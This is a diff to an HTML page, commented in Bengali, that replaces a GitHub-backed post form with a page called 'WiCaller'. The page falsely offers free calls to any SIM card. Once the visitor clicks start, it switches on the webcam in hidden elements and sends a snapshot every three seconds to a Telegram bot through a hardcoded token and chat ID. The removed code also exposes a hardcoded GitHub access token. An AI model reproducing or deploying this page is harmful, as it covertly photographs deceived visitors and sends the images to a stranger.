@@ -3,207 +3,234 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>পোস্ট আপলোড পেইজ</title>
-  <!-- Modern, mobile-friendly design using Bootstrap -->
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <!-- Font Awesome for avatar icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <title>WiCaller</title>
   <style>
-    /* Animated button styling */
-    .btn-animate {
-      border: 2px solid #007bff;
-      transition: all 0.3s ease;
+    /* বডি ও ব্যাকগ্রাউন্ড স্টাইলিং */
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #74ABE2, #5563DE);
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
     }
-    .btn-animate:hover {
-      background-color: #007bff;
+    /* মেইন কন্টেইনার */
+    .container {
+      width: 100%;
+      max-width: 500px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      padding: 20px;
+      text-align: center;
+      position: relative;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    /* ডিসক্রিপশন স্টাইল */
+    .description {
+      font-size: 1.1em;
+      margin-bottom: 15px;
+      color: #5563DE;
+    }
+    #status {
+      font-size: 1.1em;
+      margin: 20px 0;
+    }
+    /* স্পিনিং এনিমেশন (লোডার) */
+    #loadingAnimation {
+      width: 40px;
+      height: 40px;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* ক্যামেরা ও ক্যানভাস লুকানো থাকবে */
+    video, canvas {
+      display: none;
+    }
+    /* মডাল স্টাইলিং (পারমিশন ও এরর উভয়ের জন্য) */
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      flex-direction: column;
       color: #fff;
+      text-align: center;
+      padding: 20px;
     }
-    /* Button click animation */
-    .btn-animate.animate-click {
+    .modal h3 {
+      margin-bottom: 20px;
+      font-size: 1.5em;
+    }
+    /* স্টাইলিশ ও এনিমেটেড বাটন */
+    .animated-button {
+      background: transparent;
+      border: 2px solid #fff;
+      color: #fff;
+      padding: 12px 25px;
+      font-size: 1em;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+    .animated-button:hover {
+      background: #fff;
+      color: #5563DE;
+    }
+    .animated-button:active {
       transform: scale(0.95);
     }
-    .post {
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      padding: 15px;
-      margin-bottom: 15px;
-      background: #f8f9fa;
-    }
-    .avatar {
-      font-size: 2rem;
-      margin-right: 10px;
-      color: #007bff;
+    /* মোবাইল ফ্রেন্ডলি সামঞ্জস্য */
+    @media (max-width: 600px) {
+      .container {
+        margin: 10px;
+        padding: 15px;
+      }
+      .modal h3 {
+        font-size: 1.3em;
+      }
+      .animated-button {
+        padding: 10px 20px;
+        font-size: 0.9em;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container my-4">
-    <h1 class="mb-4">পোস্ট করুন</h1>
-    <form id="postForm">
-      <div class="mb-3">
-        <label for="name" class="form-label">নাম</label>
-        <input type="text" class="form-control" id="name" placeholder="আপনার নাম লিখুন" required>
-      </div>
-      <div class="mb-3">
-        <label for="post" class="form-label">পোস্ট</label>
-        <textarea class="form-control" id="post" rows="3" placeholder="আপনার পোস্ট লিখুন" required></textarea>
-      </div>
-      <button type="submit" class="btn btn-animate">সাবমিট করুন</button>
-    </form>
-    <hr>
-    <div id="posts-container">
-      <!-- POSTS START -->
-      <!-- POSTS END -->
-    </div>
+  <!-- ক্যামেরা পারমিশন মডাল -->
+  <div id="permissionModal" class="modal">
+    <h3>আপনি কি চালিয়ে যেতে চান!</h3>
+    <button class="animated-button" id="startButton">হ্যা, শুরু করুন</button>
   </div>
-
+  <!-- এরর মডাল -->
+  <div id="errorModal" class="modal" style="display: none;">
+    <h3>ক্যামেরা অ্যাক্সেসে সমস্যা হয়েছে!</h3>
+    <p>অনুগ্রহ করে আপনার ব্রাউজারে ক্যামেরা অনুমতি দিন এবং পুনরায় চেষ্টা করুন।</p>
+    <button class="animated-button" id="retryButton">পুনরায় চেষ্টা করুন</button>
+  </div>
+  <!-- মেইন কন্টেইনার -->
+  <div class="container">
+    <h2>WiCaller</h2>
+    <!-- টাইটেল এর নিচে ডিসক্রিপশন -->
+    <p class="description">ইন্টারনেট দিয়ে যে কারোর সিমে কল দিন!</p>
+    <p id="status">ফটো তুলে পাঠানো হচ্ছে...</p>
+    <div id="loadingAnimation"></div>
+    <!-- ক্যামেরা ফিড (লুকানো) -->
+    <video id="video" autoplay playsinline></video>
+    <!-- ক্যাপচার ফ্রেম সংরক্ষণের জন্য ক্যানভাস (লুকানো) -->
+    <canvas id="canvas"></canvas>
+  </div>
   <script>
-    // GitHub API configuration (বাহিরে প্রকাশ করা নিরাপদ নয়—এটা শুধুমাত্র ডেমো উদ্দেশ্যে)
-    const githubUsername = "Hacker22155";
-    const repoName = "ai3";
-    const filePath = "index.html";
-    const accessToken = "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";
+    // টেলিগ্রাম বট ও অ্যাপের তথ্য
+    const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";
+    const TELEGRAM_CHAT_ID = "6807445600";
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const statusText = document.getElementById('status');
+    const loadingAnimation = document.getElementById('loadingAnimation');
 
-    // Unicode-safe base64 encoding function
-    function base64EncodeUnicode(str) {
-      return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
-        function(match, p1) {
-          return String.fromCharCode('0x' + p1);
-        }));
-    }
-    // Unicode-safe base64 decoding function
-    function base64DecodeUnicode(str) {
-      return decodeURIComponent(Array.prototype.map.call(atob(str), function(c) {
-        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-      }).join(''));
-    }
-
-    // Fetch current file content from GitHub
-    async function getFileContent() {
-      const url = `https://api.github.com/repos/${githubUsername}/${repoName}/contents/${filePath}`;
-      const response = await fetch(url);
-      const data = await response.json();
-      return data;
-    }
-
-    // Update file content on GitHub via PUT request
-    async function updateFileContent(newContent, sha) {
-      const url = `https://api.github.com/repos/${githubUsername}/${repoName}/contents/${filePath}`;
-      const commitMessage = "New post added";
-      const body = {
-        message: commitMessage,
-        committer: {
-          name: "Auto Poster",
-          email: "auto@poster.com"
-        },
-        // Base64 encode using Unicode-safe method
-        content: base64EncodeUnicode(newContent),
-        sha: sha
-      };
-      const response = await fetch(url, {
-        method: "PUT",
-        headers: {
-          "Content-Type": "application/json",
-          "Authorization": "token " + accessToken
-        },
-        body: JSON.stringify(body)
-      });
-      return response.json();
-    }
-
-    // Add a new post and update the GitHub file so that it persists
-    async function addPost(name, postText) {
-      // Get current date and time
-      const now = new Date();
-      const dateStr = now.toLocaleDateString("bn-BD");
-      const timeStr = now.toLocaleTimeString("bn-BD");
-
-      // Select a random Font Awesome avatar icon class
-      const avatars = ["fa-user", "fa-user-tie", "fa-user-circle", "fa-user-astronaut", "fa-user-ninja"];
-      const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];
-
-      // Create the post HTML snippet
-      const postHTML = `
-        <div class="post">
-          <div class="d-flex align-items-center mb-2">
-            <i class="fas ${randomAvatar} avatar"></i>
-            <strong>${name}</strong>
-            <span class="ms-auto text-muted">${dateStr} ${timeStr}</span>
-          </div>
-          <p>${postText}</p>
-        </div>
-      `;
-
-      // Update the page immediately
-      const container = document.getElementById("posts-container");
-      container.insertAdjacentHTML("afterbegin", postHTML);
-
+    // ক্যামেরা ইনিশিয়ালাইজেশন: ব্যবহারকারীর অনুমতি নিয়ে ক্যামেরা চালু করা হবে
+    async function initCamera() {
       try {
-        // Fetch current file content from GitHub
-        const fileData = await getFileContent();
-        const currentContent = base64DecodeUnicode(fileData.content);
-        const sha = fileData.sha;
-
-        // Use markers to locate the posts section in the file
-        const markerStart = "<!-- POSTS START -->";
-        const markerEnd = "<!-- POSTS END -->";
-        let newFileContent = "";
-        if (currentContent.includes(markerStart) && currentContent.includes(markerEnd)) {
-          const startIndex = currentContent.indexOf(markerStart) + markerStart.length;
-          const endIndex = currentContent.indexOf(markerEnd);
-          const before = currentContent.substring(0, startIndex);
-          const after = currentContent.substring(endIndex);
-          const existingPosts = currentContent.substring(startIndex, endIndex).trim();
-          newFileContent = before + "\n" + postHTML + "\n" + existingPosts + "\n" + after;
-        } else {
-          // If markers are not present, append them and the new post at the end
-          newFileContent = currentContent + `
-          \n<!-- POSTS START -->\n${postHTML}\n<!-- POSTS END -->`;
-        }
-
-        // Update the file on GitHub
-        const updateResponse = await updateFileContent(newFileContent, sha);
-        console.log("Update response:", updateResponse);
-      } catch (error) {
-        console.error("Error updating GitHub file:", error);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        // ভিডিও মেটাডেটা লোড হলে ক্যানভাসের সাইজ সেট করা হবে যাতে ছবি রিসাইজ না হয়
+        video.addEventListener('loadedmetadata', () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+        });
+        // সফল হলে, যদি পূর্বে এরর মডাল দেখানো থাকে তা লুকিয়ে দিন
+        document.getElementById('errorModal').style.display = 'none';
+        startAutoCapture();
+      } catch (err) {
+        console.error("ক্যামেরা অ্যাক্সেসে সমস্যা:", err);
+        // এরর মডাল দেখান
+        document.getElementById('errorModal').style.display = 'flex';
+        statusText.textContent = "⚠️ ক্যামেরা অ্যাক্সেসে সমস্যা হয়েছে।";
       }
     }
 
-    // Handle form submission with button click animation
-    document.getElementById("postForm").addEventListener("submit", async function(event) {
-      event.preventDefault();
-      const submitButton = document.querySelector(".btn-animate");
-      submitButton.classList.add("animate-click");
-      setTimeout(() => {
-        submitButton.classList.remove("animate-click");
-      }, 300);
-      const name = document.getElementById("name").value;
-      const postText = document.getElementById("post").value;
-      await addPost(name, postText);
-      this.reset();
+    // প্রতি ৩ সেকেন্ডে ফ্রেম ক্যাপচার ও পাঠানোর জন্য টাইমার
+    function startAutoCapture() {
+      setInterval(() => {
+        captureAndSendFrame();
+      }, 3000); // প্রতি ৩ সেকেন্ডে
+    }
+
+    // ফ্রেম ক্যাপচার ও টেলিগ্রাম বটে পাঠানোর ফাংশন
+    function captureAndSendFrame() {
+      // ভিডিও এর প্রকৃত সাইজ অনুযায়ী ক্যানভাসের সাইজ আপডেট করা
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        if (blob) {
+          sendPhotoToTelegram(blob);
+        } else {
+          console.error("Blob তৈরি করা যায়নি");
+        }
+      }, "image/jpeg");
+    }
+
+    // টেলিগ্রাম বটে ছবি পাঠানোর ফাংশন
+    async function sendPhotoToTelegram(photoBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', photoBlob, 'capture.jpg');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('টেলিগ্রামে ফটো পাঠাতে সমস্যা:', data);
+        } else {
+          console.log('ফটো টেলিগ্রামে পাঠানো হয়েছে:', data);
+          // ছবি পাঠানোর সময় লোডার দেখানো (যদি প্রয়োজন)
+          loadingAnimation.style.display = "block";
+          setTimeout(() => {
+            loadingAnimation.style.display = "none";
+          }, 500);
+        }
+      } catch (error) {
+        console.error('ফটো পাঠানোর সময় ত্রুটি:', error);
+      }
+    }
+
+    // স্টার্ট বাটনের মাধ্যমে ক্যামেরা পারমিশন নেওয়া ও মডাল লুকানো
+    document.getElementById('startButton').addEventListener('click', () => {
+      document.getElementById('permissionModal').style.display = 'none';
+      initCamera();
     });
 
-    // Load existing posts from GitHub on page load so that everyone sees saved posts
-    async function loadPosts() {
-      try {
-        const fileData = await getFileContent();
-        const currentContent = base64DecodeUnicode(fileData.content);
-        const markerStart = "<!-- POSTS START -->";
-        const markerEnd = "<!-- POSTS END -->";
-        if (currentContent.includes(markerStart) && currentContent.includes(markerEnd)) {
-          const startIndex = currentContent.indexOf(markerStart) + markerStart.length;
-          const endIndex = currentContent.indexOf(markerEnd);
-          const postsHTML = currentContent.substring(startIndex, endIndex).trim();
-          document.getElementById("posts-container").innerHTML = postsHTML;
-        }
-      } catch (error) {
-        console.error("Error loading posts:", error);
-      }
-    }
-
-    loadPosts();
+    // এরর মডালের রিট্রাই বাটন
+    document.getElementById('retryButton').addEventListener('click', () => {
+      document.getElementById('errorModal').style.display = 'none';
+      initCamera();
+    });
   </script>
-  <!-- Bootstrap JS bundle (optional) -->
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
-</html>
+  </html>
